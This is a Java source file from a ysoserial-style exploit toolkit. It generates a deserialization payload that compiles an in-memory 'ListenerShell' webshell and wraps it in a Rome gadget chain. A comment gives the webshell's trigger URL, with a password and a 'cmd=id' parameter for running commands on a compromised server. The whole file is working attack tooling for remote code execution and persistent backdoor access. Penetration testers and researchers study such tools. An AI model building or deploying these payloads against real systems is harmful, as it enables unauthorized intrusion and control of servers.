package ysoserial.payloads.memshell;

import ysoserial.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.JavaCompiler;
import ysoserial.payloads.util.ReadWrite;


//filter 内存马 /1nhann?password=1nhann&cmd=id
public class ListenerShell {
    public static void main(final String[] args) throws Exception {
        Object evil = new ListenerShell().getObject(RomeTools.class);
        byte[] ser = Serializer.serialize(evil);
    }

    public Object getObject(Class gadget) throws Exception {
        byte[] bytes = ReadWrite.readResource(ListenerShell.class, "内存马/ListenerShell.java");
        String java = new String(bytes);
        byte[] b = JavaCompiler.compile("ListenerShell",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }

}
